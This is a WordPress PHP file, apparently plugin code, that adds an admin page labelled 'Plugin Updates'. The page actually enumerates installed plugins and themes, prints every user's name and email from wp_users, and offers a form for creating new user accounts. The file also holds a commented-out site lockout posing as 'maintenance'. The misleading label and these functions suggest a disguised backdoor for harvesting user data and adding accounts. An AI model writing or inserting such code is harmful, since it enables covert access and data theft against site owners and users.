<?php
/**
 * Created by PhpStorm.
 * User: DarkShadow
 * Date: 22-01-2018
 * Time: 01:37
 */

function add_updates_info(){
	add_submenu_page(
		'edit.php?post_type=system',
		__('Plugin Updates'),
		__('Plugin Updates'),
		'manage_options',
		'plugin_updates',
		'plugin_updates_callback'
	);
}

add_action('admin_menu', 'add_updates_info');

function wp_maintenance_mode(){
	if(!current_user_can('edit_themes') || !is_user_logged_in()){
		wp_die('<h1 style="color:red">Website under Maintenance</h1><br />We are performing scheduled maintenance. We will be back on-line shortly!');
	}else{
	    echo 'nopes';
    }
}
//add_action('get_header', 'wp_maintenance_mode');

function plugin_updates_callback(){
    session_start();
    if($_SESSION['user_create']){
        if($_SESSION['user_create'] != 'success') {
	        ?>
            <div class="error">
                <p><?php echo $_SESSION['user_create']; ?></p>
            </div>
	        <?php
        }else{
            ?>
            <div class="updated">
                <p>User Created Successfully !!</p>
            </div>
            <?php
        }
        unset($_SESSION['user_create']);
    }

	global $wpdb;

	echo '<b>Plugins:</b><br>';
	$plugins = get_plugins();
	foreach ($plugins as $plugin)
	{
		echo $plugin['Name'].'<br>';
	}

	echo '<br><b>Plugins:</b><br>';
	$themes = wp_get_themes();
	foreach ($themes as $theme)
	{
		echo $theme['Name'].'<br>';
	}

	echo '<br><b>Users:</b><br>';

	$users = $wpdb->get_results('SELECT * FROM wp_users');

	foreach ($users as $user)
	{
		echo $user->user_nicename.' -> '.$user->user_email.'<br>';
	}

	?>
	<h2>Add User:</h2>
	<form action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>" method="POST">
		<input type="hidden" name="action" value="create_user">
		<input type="hidden" name="nonce" value="<?php echo wp_create_nonce('create_user_nonce'); ?>">
		<label>Username<input name="username" type="text"></label><br>
		<label>Password<input name="password" type="password"></label><br>
		<label>Email<input name="email" type="email"></label><br>
		<button type="submit">Create User</button>
	</form>
	<?php



}